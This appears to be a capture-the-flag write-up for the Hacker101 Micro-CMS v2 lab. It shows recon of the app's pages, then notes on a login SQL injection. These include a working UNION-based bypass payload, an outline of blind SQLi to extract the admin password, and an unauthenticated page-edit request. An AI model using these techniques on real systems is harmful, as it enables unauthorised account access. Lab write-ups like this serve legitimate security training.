# Hacker101: Micro-CMS v2

## By Infinity




## Recon:




### /

<details>
<summary>Headers</summary>
```html
Date
Content-Type
Content-Length
Connection
Server
```
</details>
<details>
<summary>Response</summary>
```html

<!doctype html>
<html>
	<head>
		<title>Micro-CMS</title>
	</head>
	<body>
		
		<ul>
<li><a href="page/1">Micro-CMS Changelog</a></li>
<li><a href="page/2">Markdown Test</a></li>
		</ul>
		<a href="page/create">Create a new page</a>
	</body>
</html>

```
</details>
<details>
<summary>Rendered</summary>


<!doctype html>
<html>
	<head>
		<title>Micro-CMS</title>
	</head>
	<body>
		
		<ul>
<li><a href="page/1">Micro-CMS Changelog</a></li>
<li><a href="page/2">Markdown Test</a></li>
		</ul>
		<a href="page/create">Create a new page</a>
	</body>
</html>

</details>

### /page/1

<details>
<summary>Headers</summary>
```html
Date
Content-Type
Content-Length
Connection
Server
```
</details>
<details>
<summary>Response</summary>
```html

<!doctype html>
<html>
	<head>
		<title>Micro-CMS Changelog</title>
	</head>
	<body>
		<a href="../">&lt;-- Go Home</a><br>
		<a href="edit/1">Edit this page</a>
		<h1>Micro-CMS Changelog</h1>
<h2>Version 2</h2>
<p>This version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.</p>
	</body>
</html>

```
</details>
<details>
<summary>Rendered</summary>


<!doctype html>
<html>
	<head>
		<title>Micro-CMS Changelog</title>
	</head>
	<body>
		<a href="../">&lt;-- Go Home</a><br>
		<a href="edit/1">Edit this page</a>
		<h1>Micro-CMS Changelog</h1>
<h2>Version 2</h2>
<p>This version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.</p>
	</body>
</html>

</details>

### /page/2

<details>
<summary>Headers</summary>
```html
Date
Content-Type
Content-Length
Connection
Server
```
</details>
<details>
<summary>Response</summary>
```html

<!doctype html>
<html>
	<head>
		<title>Markdown Test</title>
	</head>
	<body>
		<a href="../">&lt;-- Go Home</a><br>
		<a href="edit/2">Edit this page</a>
		<h1>Markdown Test</h1>
<p>Just testing some markdown functionality.</p>
<p><img alt="adorable kitten" src="https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/" /></p>
<p><button>Some button</button></p>
	</body>
</html>

```
</details>
<details>
<summary>Rendered</summary>


<!doctype html>
<html>
	<head>
		<title>Markdown Test</title>
	</head>
	<body>
		<a href="../">&lt;-- Go Home</a><br>
		<a href="edit/2">Edit this page</a>
		<h1>Markdown Test</h1>
<p>Just testing some markdown functionality.</p>
<p><img alt="adorable kitten" src="https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/" /></p>
<p><button>Some button</button></p>
	</body>
</html>

</details>

### /page/create

<details>
<summary>Headers</summary>
```html
Date
Content-Type
Content-Length
Connection
Server
Location
```
</details>
<details>
<summary>Response</summary>
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login">/login</a>.  If not click the link.
```
</details>
<details>
<summary>Rendered</summary>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login">/login</a>.  If not click the link.
</details>

### /login

<details>
<summary>Headers</summary>
```html
Date
Content-Type
Content-Length
Connection
Server
```
</details>
<details>
<summary>Response</summary>
```html

<!doctype html>
<html>
	<head>
		<title>Log in</title>
	</head>
	<body>
		<a href="home">&lt;-- Go Home</a>
		<h1>Log In</h1>
		<form method="POST">
			Username: <input type="text" name="username"><br>
			Password: <input type="password" name="password"><br>
			<input type="submit" value="Log In">
			<div style="color: red"></div>
		</form>
	</body>
</html>

```
</details>
<details>
<summary>Rendered</summary>


<!doctype html>
<html>
	<head>
		<title>Log in</title>
	</head>
	<body>
		<a href="home">&lt;-- Go Home</a>
		<h1>Log In</h1>
		<form method="POST">
			Username: <input type="text" name="username"><br>
			Password: <input type="password" name="password"><br>
			<input type="submit" value="Log In">
			<div style="color: red"></div>
		</form>
	</body>
</html>

</details>

## Notes:
- Login function => sql injection.
- Modifying password does not work, but modifying username throws error:
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''test''' at line 1")

```
- As you can see, the username is being put into an unfiltered sql query. 
- Using this: ```username=test'+UNION+SELECT+'a'--+&password=a``` yields access to normal account. 
- Getting admin password is possible via blind sqli, via differing results. We can set up a sql query to check a conditional, where wrong user = false and wrong password = true. We can thus extract the admin username and password. 
- We can also just directly edit pages by posting to the /page/edit/2 endpoint.

## Flags
1. In a private page accesed via union attack
2. In a response to posting to the /page/edit/whatever endpoint
3. After entering the admin username and password acquired via blind sqli
